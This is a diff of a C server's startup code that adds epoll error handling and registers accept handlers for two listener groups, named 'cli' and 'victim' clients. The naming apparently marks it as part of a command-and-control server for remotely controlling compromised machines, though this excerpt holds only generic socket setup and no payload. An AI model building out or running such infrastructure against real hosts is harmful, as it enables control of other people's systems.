@@ -12,9 +12,9 @@
 /* Global Vars */
 struct commandServer server; /* Server global state  */
 
-/* Admittedly it is overkill and probably way too overly complicated. Mayble will clean up later, but it's fun?  */
+/* Admittedly it is overkill and probably overly complicated. Mayble will clean up later, but it's fun?  */
 void asciiArt(void){
-#include "asciilogo2.h"
+#include "asciilogo.h"
 
         char *buf = malloc(1024*16);
 
@@ -56,21 +56,29 @@ void initServer(void){
         server.victimfd_count = 0;
 
         server.event_loop = createEpollEventLoop();
+        if (server.event_loop == NULL) {
+                perror("Failed to create epoll event loop");
+                exit(-1);
+        }
 
-        /* Open Sockets */
+        /* Open Sockets for both cli and victim clients */
         openTcpSocket(server.cli_port, server.clifd, &server.clifd_count);
         openTcpSocket(server.victim_port, server.victimfd, &server.victimfd_count);
        
         /* Initialize Server Commands */
 
-        /* Handle Events  */
-        // Create event_loop fd to handle connecting cli clients
+        /* Add client socket fd to epoll - handle connecting cli clients */
         int j;
         for(j=0; j < server.clifd_count; j++) {
-               if (createEpollEvent(server.event_loop, server.clifd[j], EVENT_READ) == EVENT_ERR)                  
+               if (addEpollEvent(server.event_loop, server.clifd[j], EVENT_READ, handleAcceptTcp) == EVENT_ERR)                  
                         perror("createEpollFileEvent");
         }
-        // Create event_loop fd to handle connecting victim clients
+        
+        /* Add victim socket fd to epoll - handle connecting victim clients */
+        for(j=0; j < server.victimfd_count; j++) {
+               if (addEpollEvent(server.event_loop, server.victimfd[j], EVENT_READ, handleAcceptTcp) == EVENT_ERR)                  
+                        perror("createEpollFileEvent");
+        }
 
 }
 
@@ -81,8 +89,9 @@ int main(void){
         initServer();
         asciiArt();
 
-        // Main Event Loop
-        eventMain(server.event_loop, server.clifd[0]);
-        
+        eventMain(server.event_loop);
+       
+        // delete eventloop & cleanup memory
+
         return 0;
 }
